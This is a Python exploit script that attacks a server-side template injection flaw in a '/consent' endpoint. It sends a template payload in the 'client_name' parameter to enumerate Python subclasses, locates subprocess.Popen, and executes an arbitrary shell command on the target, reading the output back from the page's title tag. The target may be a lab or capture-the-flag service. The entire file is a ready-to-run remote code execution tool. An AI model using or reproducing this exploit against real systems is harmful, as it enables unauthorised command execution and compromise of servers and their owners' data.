import requests
import os,sys,re
import argparse
import logging
import time

##
##

# Configure logging
logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')

def parse_arguments():
    parser = argparse.ArgumentParser(description="Enumerate and exploit SSTI vulnerability in /consent endpoint.")
    parser.add_argument('--ip', type=str, default='localhost', help='Target IP address (default: localhost)')
    parser.add_argument('--port', type=int, default=666, help='Target port (default: 666)')
    parser.add_argument('--client_id', type=str, required=True, help='Client ID registered via /register endpoint')
    parser.add_argument('--scope', type=str, default='read,write', help='Scopes to request (default: read,write)')
    parser.add_argument('--command', type=str, default='uname -a', help='Command to execute (default: "uname -a")')
    parser.add_argument('--buffer', type=int, default=5, help='Buffer range around detected index (default: 5)')
    parser.add_argument('--delay', type=float, default=0.1, help='Delay between requests in seconds (default: 0.1)')
    parser.add_argument('--output', type=str, default='subclasses_full.txt', help='Output file to save subclasses list (default: subclasses_full.txt)')
    return parser.parse_args()

def enumerate_subclasses(url, client_id, scope):
    """
    Sends a payload to enumerate all Python subclasses via the SSTI vulnerability.
    """
    enumerate_payload = "{{ ''.__class__.__mro__[1].__subclasses__() }}"
    params = {
        "client_id": client_id,
        "client_name": enumerate_payload,
        "scope": scope
    }

    try:
        logging.info(f"Sending enumeration payload to {url}")
        response = requests.get(url, params=params, timeout=10)
        response.raise_for_status()
    except requests.exceptions.HTTPError as http_err:
        logging.error(f"HTTP error during enumeration: {http_err}")
        logging.error(f"Response Content: {response.text}")
        sys.exit(1)
    except requests.exceptions.RequestException as e:
        logging.error(f"Request failed during enumeration: {e}")
        sys.exit(1)

    # Extract the content of the <title> tag
    title_content = re.search(r"<title>Consent for (.*?)</title>", response.text, re.DOTALL)

    if title_content:
        # The payload returns a list, rendered as a string like:
        # [<class 'type'>, <class 'async_generator'>, ..., <class 'subprocess.Popen'>, ...]
        class_list_str = title_content.group(1)

        # Extract all class names within <class '...'>
        subclasses = re.findall(r"<class '([^']+)'>", class_list_str)

        if subclasses:
            logging.info(f"Found {len(subclasses)} subclasses.")
            return subclasses
        else:
            logging.warning("Failed to extract subclasses from the <title> tag. The payload might not be executing correctly.")
            return []
    else:
        logging.warning("No <title> tag found in the response. Please ensure the payload is injected correctly.")
        return []

def save_subclasses(subclasses, output_file):
    """
    Saves the list of subclasses to a specified file.
    """
    try:
        with open(output_file, "w") as f:
            for idx, cls in enumerate(subclasses):
                f.write(f"{idx}: {cls}\n")
        logging.info(f"Subclasses list saved to {output_file}")
    except IOError as e:
        logging.error(f"Failed to write to file {output_file}: {e}")
        sys.exit(1)

def find_popen_index(subclasses):
    """
    Searches for 'subprocess.Popen' in the subclasses list and returns its index.
    """
    try:
        index = subclasses.index('subprocess.Popen')
        logging.info(f"'subprocess.Popen' found at index {index}")
        return index
    except ValueError:
        logging.error("'subprocess.Popen' not found in subclasses list.")
        sys.exit(1)

def execute_command(url, client_id, scope, index, command):
    """
    Executes a command via SSTI vulnerability using the specified subclass index.
    Returns the output if successful, None otherwise.
    """
    # Decode the output to ensure it's a string
    payload = f"{{{{ ''.__class__.__mro__[1].__subclasses__()[{index}]('{command}', shell=True, stdout=-1).communicate()[0].decode() }}}}"
    params = {
        "client_id": client_id,
        "client_name": payload,
        "scope": scope
    }

    try:
        logging.info(f"Executing command at index {index}: {command}")
        response = requests.get(url, params=params, timeout=10)
        if response.status_code == 200:
            # Extract command output from the <title> tag
            match = re.search(r"<title>Consent for (.*?)</title>", response.text, re.DOTALL)
            if match:
                command_output = match.group(1).strip()
                logging.info(f"Command Output: {command_output}")
                return command_output
        elif response.status_code == 500:
            logging.warning(f"Internal Server Error at index {index}.")
    except requests.exceptions.HTTPError as http_err:
        logging.error(f"HTTP error during command execution: {http_err}")
        logging.error(f"Response Content: {response.text}")
    except requests.exceptions.RequestException as e:
        logging.error(f"Request failed during command execution: {e}")

    return None

def main():
    args = parse_arguments()

    base_url = f"http://{args.ip}:{args.port}/consent"

    # Enumerate subclasses
    subclasses = enumerate_subclasses(base_url, args.client_id, args.scope)

    if not subclasses:
        logging.error("No subclasses enumerated. Exiting.")
        sys.exit(1)

    # Print all subclasses with indices
    logging.info("List of subclasses:")
    for idx, cls in enumerate(subclasses):
        print(f"{idx}: {cls}")

    # Save subclasses to file
    save_subclasses(subclasses, args.output)

    # Find 'subprocess.Popen' index
    popen_index = find_popen_index(subclasses)

    # Define buffer range
    buffer_range = args.buffer
    start_index = max(popen_index - buffer_range, 0)
    end_index = min(popen_index + buffer_range, len(subclasses) - 1)

    logging.info(f"Attempting to exploit within the buffer range: {start_index} to {end_index}")

    # Iterate through the buffer range to find the correct index
    for idx in range(start_index, end_index + 1):
        if idx == popen_index:
            continue  # Already identified, optional
        output = execute_command(base_url, args.client_id, args.scope, idx, args.command)
        if output:
            print(f"\nCommand '{args.command}' executed successfully at index {idx}:")
            print(output)
            sys.exit(0)
        time.sleep(args.delay)

    # Finally, try the detected index
    logging.info(f"Attempting to exploit at the detected 'subprocess.Popen' index: {popen_index}")
    output = execute_command(base_url, args.client_id, args.scope, popen_index, args.command)
    if output:
        print(f"\nCommand '{args.command}' executed successfully at index {popen_index}:")
        print(output)
    else:
        print("\nFailed to execute the command within the buffer range.")

if __name__ == "__main__":
    main()

##
##
